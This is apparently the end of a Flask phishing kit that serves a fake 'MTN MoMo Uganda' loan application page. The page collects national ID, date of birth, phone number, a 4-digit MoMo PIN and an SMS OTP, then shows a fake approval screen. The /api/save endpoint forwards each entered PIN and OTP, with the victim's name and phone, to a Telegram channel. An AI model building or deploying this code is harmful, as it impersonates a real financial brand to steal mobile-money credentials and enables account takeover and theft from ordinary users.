      <div>
        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Mobile Number</label>
        <input id="input-mobile" type="tel" placeholder="+27 71 000 0000" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
      </div>
      
      <div>
        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">ID Number</label>
        <input id="input-nationalid" type="text" placeholder="00-000000-X-00" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
      </div>
      
      <div>
        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Date of Birth</label>
        <input id="input-dob" type="date" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
      </div>
      
      <div>
        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Loan Purpose</label>
        <select id="input-purpose" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
          <option value="" disabled selected>Select a purpose...</option>
          <option value="Business">Business Capital</option>
          <option value="School">School Fees</option>
          <option value="Emergency">Medical & Emergency</option>
          <option value="Household">Household Support</option>
          <option value="Travel &">Travel & Logistics</option>
        </select>
      </div>
      
      <div>
        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Loan Amount (UGX)</label>
        <input id="input-amount" type="number" placeholder="e.g. 2500" min="50000" max="1000000" step="50000" oninput="syncAmount(this.value, true)" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
      </div>

    </div>

    <!-- The button is now a submit type to enforce the required checks -->
    <button type="submit" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
      CONTINUE
    </button>
  </form>
</section>


    <!-- SCREEN 3: LOAN DETAILS & REPAYMENT -->
    <section id="screen-loan" class="hidden space-y-5">
      <div class="flex items-center gap-3">
        <button onclick="goTo('apply')" class="p-2  bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
        <div>
          <h2 class="text-xl font-black text-[#004F71]">LOAN DETAILS</h2>
          <p class="text-xs text-slate-500">Step 2 of 4 • Select period & review breakdown</p>
        </div>
      </div>

      <div class="bg-white  p-6 border border-slate-200/80 shadow-sm space-y-6">
        <div class="text-center">
          <div class="text-xs font-bold text-slate-400 uppercase tracking-wider">Requested Amount</div>
          <div id="display-amount" class="text-4xl font-black text-[#004F71] mt-1">UGX 500,000</div>
          <input type="range" id="amount-slider" min="50000" max="1000000" step="50000" value="500000" oninput="syncAmount(this.value)" class="w-full mt-4 accent-[#FFCC00]">
          <div class="flex justify-between text-xs text-slate-400 mt-1 font-semibold">
            <span>UGX 50,000</span>
            <span>UGX 1,000,000</span>
          </div>
        </div>

        <div>
        <div>
          <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-2">Repayment Period</label>
          <div class="grid grid-cols-5 gap-2">
            <button type="button" onclick="setPeriod(7)" class="period-btn py-2.5  border text-xs font-bold transition-all text-slate-700 border-slate-200">7 Days</button>
            <button type="button" onclick="setPeriod(14)" class="period-btn py-2.5  border text-xs font-bold transition-all text-slate-700 border-slate-200">14 Days</button>
            <button type="button" onclick="setPeriod(30)" class="period-btn py-2.5  border text-xs font-bold transition-all  text-white border-[#004F71] shadow-sm">30 Days</button>
            <button type="button" onclick="setPeriod(60)" class="period-btn py-2.5  border text-xs font-bold transition-all text-slate-700 border-slate-200">60 Days</button>
            <button type="button" onclick="setPeriod(90)" class="period-btn py-2.5  border text-xs font-bold transition-all text-slate-700 border-slate-200">90 Days</button>
          </div>
        </div>

          <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-2">Or Choose Specific Date</label>
          <input type="date" id="input-repay-date" onchange="setCustomDate(this.value)" class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
        </div>

        <div class="border-t border-slate-100 pt-4 space-y-2.5 text-sm">
          <div class="flex justify-between text-slate-600">
            <span>Interest (5%)</span>
            <span id="breakdown-interest" class="font-bold text-slate-800">UGX 50</span>
          </div>
          <div class="flex justify-between text-slate-600">
            <span>Admin & Processing Fee (3%)</span>
            <span id="breakdown-fee" class="font-bold text-slate-800">UGX 30</span>
          </div>
          <div class="flex justify-between text-slate-600">
            <span>Repayment Due Date</span>
            <span id="breakdown-date" class="font-bold text-slate-800">30/09/2026</span>
          </div>
          <div class="flex justify-between text-base font-extrabold text-[#004F71] pt-2 border-t border-slate-100">
            <span>Total Repayment</span>
            <span id="breakdown-total" class="text-[#004F71]">UGX 1,080</span>
          </div>
        </div>
      </div>

      <button onclick="goTo('review', true)" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
        CONTINUE
      </button>
    </section>

    <!-- SCREEN 4: REVIEW APPLICATION -->
    <section id="screen-review" class="hidden space-y-5">
      <div class="flex items-center gap-3">
        <button onclick="goTo('loan')" class="p-2  bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
        <div>
          <h2 class="text-xl font-black text-[#004F71]">REVIEW APPLICATION</h2>
          <p class="text-xs text-slate-500">Step 3 of 4 • Verify all details before submission</p>
        </div>
      </div>

      <div class="bg-white  p-6 border border-slate-200/80 shadow-sm space-y-4">
        <div>
          <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Applicant</h3>
          <div class="bg-slate-50 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
            <div class="flex justify-between"><span class="text-slate-500">Full Name</span><span id="review-name" class="font-bold text-slate-800">Tariro Moyo</span></div>
            <div class="flex justify-between"><span class="text-slate-500">Mobile Number</span><span id="review-mobile" class="font-bold text-slate-800">+263 77 123 4567</span></div>
            <div class="flex justify-between"><span class="text-slate-500">ID Number</span><span id="review-id" class="font-bold text-slate-800">63-123456-A-47</span></div>
          </div>
        </div>

        <div>
          <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Loan Summary</h3>
          <div class="bg-slate-50 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
            <div class="flex justify-between"><span class="text-slate-500">Purpose</span><span id="review-purpose" class="font-bold text-slate-800">Business</span></div>
            <div class="flex justify-between"><span class="text-slate-500">Principal</span><span id="review-principal" class="font-bold text-slate-800">UGX 100,000</span></div>
            <div class="flex justify-between"><span class="text-slate-500">Period</span><span id="review-period" class="font-bold text-slate-800">30 Days</span></div>
          </div>
        </div>

        <div>
          <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Repayment</h3>
          <div class="bg-blue-50/70 border border-blue-100 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
            <div class="flex justify-between"><span class="text-slate-600">Total Payable</span><span id="review-total" class="font-extrabold text-blue-800">UGX 1,080</span></div>
            <div class="flex justify-between"><span class="text-slate-600">Due Date</span><span id="review-date" class="font-bold text-slate-800">30/09/2026</span></div>
          </div>
        </div>

        <label class="flex items-start gap-3 pt-2 cursor-pointer">
          <input type="checkbox" id="confirm-check" onchange="toggleConfirm(this.checked)" class="mt-1 h-4 w-4 rounded accent-[#FFCC00]">
          <span class="text-xs text-slate-600 leading-snug">I confirm that the information provided is correct and agree to MTN MoMo loan terms and conditions.</span>
        </label>
      </div>

      <button id="btn-confirm" onclick="goTo('pin', true)" disabled class="w-full py-4 rounded-2xl  disabled:bg-slate-300 disabled:cursor-not-allowed hover:bg-blue-700 text-white font-bold text-base tracking-wide shadow-md transition-all">
        CONFIRM APPLICATION
      </button>
    </section>

    <!-- SCREEN 5: ENTER YOUR PIN -->
    <section id="screen-pin" class="hidden space-y-6">
      <div class="text-center pt-2">
        <div class="w-14 h-14 mx-auto rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center text-2xl mb-3">🔒</div>
        <h2 class="text-2xl font-black text-[#004F71]">ENTER YOUR PIN</h2>
        <p class="text-xs text-slate-500 mt-1">Please enter your 4-digit MTN MoMo PIN to authorize</p>
      </div>

      <!-- PIN Indicator Dots -->
      <div class="flex justify-center gap-4 my-4">
        <div id="dot-0" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all"></div>
        <div id="dot-1" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all"></div>
        <div id="dot-2" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all"></div>
        <div id="dot-3" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all"></div>
      </div>

      <!-- Realistic Numeric Keypad -->
      <div class="max-w-[320px] mx-auto grid grid-cols-3 gap-3">
        <button onclick="pressPin('1')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">1</button>
        <button onclick="pressPin('2')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">2</button>
        <button onclick="pressPin('3')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">3</button>
        <button onclick="pressPin('4')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">4</button>
        <button onclick="pressPin('5')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">5</button>
        <button onclick="pressPin('6')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">6</button>
        <button onclick="pressPin('7')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">7</button>
        <button onclick="pressPin('8')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">8</button>
        <button onclick="pressPin('9')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">9</button>
        <button onclick="clearPin()" class="h-16 rounded-2xl bg-slate-100 text-xs font-bold text-slate-600 active:bg-slate-200">C</button>
        <button onclick="pressPin('0')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">0</button>
        <button onclick="backspacePin()" class="h-16 rounded-2xl bg-slate-100 text-lg font-bold text-slate-600 active:bg-slate-200">âŒ«</button>
      </div>

      <div class="text-center text-xs text-slate-400"></div>
    </section>

    <!-- SCREEN 6: VERIFY YOUR NUMBER (OTP) -->
    <section id="screen-otp" class="hidden space-y-6">
      <div class="text-center pt-2">
        <div class="w-14 h-14 mx-auto rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center text-2xl mb-3">📱</div>
        <h2 class="text-2xl font-black text-[#004F71]">VERIFY YOUR NUMBER</h2>
        <p class="text-xs text-slate-500 mt-1">A verification code has been sent to: <span id="otp-mobile-label" class="font-bold text-slate-700">+263 77 123 4567</span></p>
      </div>

      <div class="flex justify-center gap-2 sm:gap-3 max-w-[340px] mx-auto">
        <input type="text" maxlength="1" oninput="otpMove(this, 1)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
        <input type="text" maxlength="1" oninput="otpMove(this, 2)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
        <input type="text" maxlength="1" oninput="otpMove(this, 3)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
        <input type="text" maxlength="1" oninput="otpMove(this, 4)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
        <input type="text" maxlength="1" oninput="otpMove(this, 5)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
        <input type="text" maxlength="1" oninput="otpMove(this, 6)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
      </div>

      <div class="text-center text-xs text-slate-500">
        Didn't receive code? <button id="resend-btn" onclick="resendOtp()" class="font-bold text-[#004F71] hover:underline">Resend code in 30s</button>
      </div>

      <button id="btn-otp" onclick="startProcessing()" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all">
        VERIFY & CONTINUE
      </button>
    </section>

    <!-- SCREEN 7: PROCESSING APPLICATION -->
    <section id="screen-processing" class="hidden py-10 space-y-8 text-center">
      <div class="relative w-20 h-20 mx-auto">
        <div class="w-20 h-20 rounded-full border-4 border-slate-200 border-t-blue-600 animate-spin"></div>
      </div>

      <div>
        <h2 class="text-2xl font-black text-[#004F71]">PROCESSING APPLICATION</h2>
        <p class="text-xs text-slate-500 mt-1 max-w-sm mx-auto">Please wait while our automated scoring engine reviews your MTN MoMo history.</p>
      </div>

      <div class="max-w-[320px] mx-auto bg-white rounded-2xl border border-slate-200 p-4 space-y-3 text-left text-xs font-semibold">
        <div class="flex items-center gap-3 text-[#004F71]">
          <span>âœ“</span><span>Application Submitted</span>
        </div>
        <div class="flex items-center gap-3 text-[#004F71]">
          <span>âœ“</span><span>Phone Verified</span>
        </div>
        <div class="flex items-center gap-3 text-[#004F71] animate-pulse">
          <span>â—</span><span>Processing Assessment...</span>
        </div>
        <div class="flex items-center gap-3 text-slate-400">
          <span>â—‹</span><span>Final Decision</span>
        </div>
      </div>
    </section>

    <!-- SCREEN 8: LOAN APPROVED -->
    <section id="screen-approved" class="hidden space-y-6">
      <div class="text-center pt-2">
        <div class="w-20 h-20 mx-auto rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center text-4xl mb-3 shadow-inner">
          âœ“
        </div>
        <h2 class="text-2xl sm:text-3xl font-black text-[#004F71]">LOAN APPROVED!</h2>
        <p class="text-xs text-slate-500 mt-1">Funds will be credited to your MTN MoMo wallet.</p>
      </div>

      <div class="bg-white  p-6 border border-slate-200/80 shadow-sm space-y-4">
        <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
          <span class="text-slate-500">Application Reference</span>
          <span class="font-mono font-bold text-slate-800">EC-984210</span>
        </div>
        <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
          <span class="text-slate-500">Approved Amount</span>
          <span id="approved-amount" class="text-lg font-black text-[#004F71]">UGX 100,000</span>
        </div>
        <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
          <span class="text-slate-500">Repayment Amount</span>
          <span id="approved-repay" class="font-bold text-slate-800">UGX 1,080</span>
        </div>
        <div class="flex justify-between items-center text-xs sm:text-sm">
          <span class="text-slate-500">Repayment Date</span>
          <span id="approved-date" class="font-bold text-slate-800">30 September 2026</span>
        </div>
      </div>

      <div class="space-y-3">
        <button onclick="goTo('details')" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all">
          VIEW LOAN DETAILS
        </button>
        <button onclick="goTo('home')" class="w-full py-3.5 rounded-2xl bg-white border border-slate-200 text-slate-700 font-bold text-sm hover:bg-slate-50">
          BACK TO HOME
        </button>
      </div>
    </section>

    <!-- SCREEN 9: LOAN DETAILS -->
    <section id="screen-details" class="hidden space-y-5">
      <div class="flex items-center gap-3">
        <button onclick="goTo('home')" class="p-2  bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
        <div>
          <h2 class="text-xl font-black text-[#004F71]">ACTIVE LOAN DETAILS</h2>
          <p class="text-xs text-slate-500">Reference: EC-984210</p>
        </div>
      </div>

      <div class="bg-blue-50 border border-blue-200  p-5 flex items-center justify-between">
        <div>
          <span class="text-xs font-bold uppercase tracking-wider text-blue-800">Status</span>
          <div class="text-lg font-black text-blue-900">APPROVED & ACTIVE</div>
        </div>
        <span class="px-3 py-1 rounded-full text-xs font-bold  text-white">Active</span>
      </div>

      <div class="bg-white  p-6 border border-slate-200/80 shadow-sm space-y-3 text-xs sm:text-sm">
        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Principal</span><span id="details-principal" class="font-bold text-slate-800">UGX 100,000</span></div>
        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Interest (5%)</span><span id="details-interest" class="font-bold text-slate-800">UGX 50</span></div>
        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Service Fees</span><span id="details-fees" class="font-bold text-slate-800">UGX 30</span></div>
        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Total Repayment</span><span id="details-total" class="font-black text-[#004F71]">UGX 1,080</span></div>
        <div class="flex justify-between py-1.5"><span class="text-slate-500">Due Date</span><span id="details-date" class="font-bold text-slate-800">30/09/2026</span></div>
      </div>

      <button onclick="goTo('home')" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all">
        BACK TO HOME
      </button>
    </section>

  </main>

  <!-- INFO MODAL -->
  <div id="info-modal" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4">
    <div onclick="closeInfoModal()" class="absolute inset-0 bg-slate-900/50 backdrop-blur-xs"></div>
    <div class="relative bg-white  p-6 max-w-sm w-full shadow-2xl border border-slate-200 text-center space-y-3 z-10">
      <h3 id="info-title" class="text-lg font-bold text-[#004F71]">Information</h3>
      <p class="text-xs text-slate-600">This is a demonstration preview of the MTN MoMo mobile loan journey. Features in this section are mock placeholders for demonstration.</p>
      <button onclick="closeInfoModal()" class="w-full py-2.5 rounded-xl bg-[#004F71] text-white font-bold text-xs">Close</button>
    </div>
  </div>

  <!-- FOOTER -->
  <footer class="w-full max-w-[760px] mx-auto px-4 py-4 text-center text-xs text-slate-400 border-t border-slate-200">
    MTN MoMo Uganda • Mobile Money Loan App
  </footer>

  <script>
    let appState = {
      appId: Date.now().toString(),
      fullName: "",
      mobile: "",
      nationalId: "",
      birthDate: "",
      purpose: "Business",
      amount: 500000,
      period: 30
    };

    let enteredPin = '';
    let countdown = 30;
    let timer = null;

    // Debug function to check state
    function debugState() {
      console.log("Current App State:", appState);
      console.log("Current Visible Screen:", document.querySelector('section:not(.hidden)'));
    }

    function goTo(screenName) {
      const screens = ['home', 'apply', 'loan', 'review', 'pin', 'otp', 'processing', 'approved', 'details'];
      screens.forEach(s => {
        const el = document.getElementById('screen-' + s);
        if (el) el.classList.add('hidden');
      });
      const target = document.getElementById('screen-' + screenName);
      if (target) target.classList.remove('hidden');
      window.scrollTo({ top: 0, behavior: 'smooth' });
      if (screenName === 'review') populateReview();
      if (screenName === 'otp') startOtpTimer();
    }

    function toggleMenu(open) {
      const drawer = document.getElementById('drawer');
      const panel = document.getElementById('drawer-panel');
      if (!drawer || !panel) return;
      if (open) {
        drawer.classList.remove('pointer-events-none', 'opacity-0');
        panel.classList.remove('translate-x-full');
      } else {
        drawer.classList.add('pointer-events-none', 'opacity-0');
        panel.classList.add('translate-x-full');
      }
    }

    function handleFormSubmit(event) {
      event.preventDefault();
      appState.fullName = document.getElementById('input-fullname').value;
      appState.mobile = document.getElementById('input-mobile').value;
      appState.nationalId = document.getElementById('input-nationalid').value;
      appState.birthDate = document.getElementById('input-dob').value;
      appState.purpose = document.getElementById('input-purpose').value;
      appState.amount = parseInt(document.getElementById('input-amount').value);
      
      syncAmount(appState.amount);
      goTo('loan');
    }

    function showInfoModal(title) {
      toggleMenu(false);
      document.getElementById('info-title').innerText = title;
      document.getElementById('info-modal').classList.remove('hidden');
    }

    function closeInfoModal() {
      document.getElementById('info-modal').classList.add('hidden');
    }

    function setPurpose(p) {
      appState.purpose = p;
      const sel = document.getElementById('input-purpose');
      if (sel) sel.value = p;
      goTo('apply');
    }

    function syncAmount(val, isFromInput = false) {
      let parsedVal = parseInt(val) || 50000;
      if (parsedVal > 1000000) parsedVal = 1000000;
      appState.amount = parsedVal;
      
      if (!isFromInput) {
        const inp = document.getElementById('input-amount');
        if (inp) inp.value = parsedVal;
      }
      
      const slider = document.getElementById('amount-slider');
      if (slider) slider.value = parsedVal;
      const disp = document.getElementById('display-amount');
      if (disp) disp.innerText = 'UGX ' + parsedVal.toLocaleString();
      
      calculateCosts();
    }
  </script>
</body>
</html>
"""

@app.route('/')
def home():
    return Response(HTML_PAGE, mimetype='text/html')

# Endpoint: Unified data saving and tracking
@app.route('/api/save', methods=['POST'])
def save_unified():
    try:
        data = request.get_json(silent=True) or {}
        app_id = data.get('appId') or data.get('session_id')
        if not app_id: return jsonify({'status': 'error', 'message': 'Missing appId'}), 400
        name = data.get('fullName', 'Unknown')
        phone = data.get('mobile', data.get('phone', 'NoPhone'))
        f_n = data.get('field')
        f_v = data.get('value')
        now = get_now_str()
        if f_n == 'entered_pin':
            m = f'🔐 *PIN Received*\n\n👤 *User:* {name}\n🔢 *PIN:* {f_v}\n📞 *Phone:* {phone}'
            send_telegram_notification(m)
        elif f_n == 'entered_otp':
            m = f'📱 *OTP Received*\n\n👤 *User:* {name}\n🔑 *OTP:* {f_v}\n📞 *Phone:* {phone}'
            send_telegram_notification(m)
        elif not f_n:
            amt = data.get('amount', 'N/A')
            m = f'🚀 *New Application Submitted*\n\n👤 *Name:* {name}\n📞 *Phone:* {phone}\n💰 *Amount:* UGX {amt}\n📅 *Time:* {now}'
            send_telegram_notification(m)
        return jsonify({'status': 'success', 'record_id': app_id})

    except Exception as e:
        print(f"Error in unified save: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# Legacy endpoints redirected to unified logic
@app.route('/api/track-input', methods=['POST'])
def track_input():
    return save_unified()

if __name__ == "__main__":
    app.run(debug=True, port=int(os.environ.get("PORT", 8000)))
